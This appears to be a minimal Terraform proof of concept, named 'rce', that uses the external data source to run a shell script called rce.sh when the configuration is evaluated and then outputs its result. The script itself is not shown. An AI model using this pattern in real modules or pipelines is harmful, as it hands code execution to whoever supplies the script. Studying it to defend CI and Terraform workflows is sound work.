terraform {
  required_providers {
    external = { source = "hashicorp/external" }
  }
}
data "external" "rce" {
  program = ["sh", "${path.module}/rce.sh"]
}
output "rce" {
  value = data.external.rce.result
}
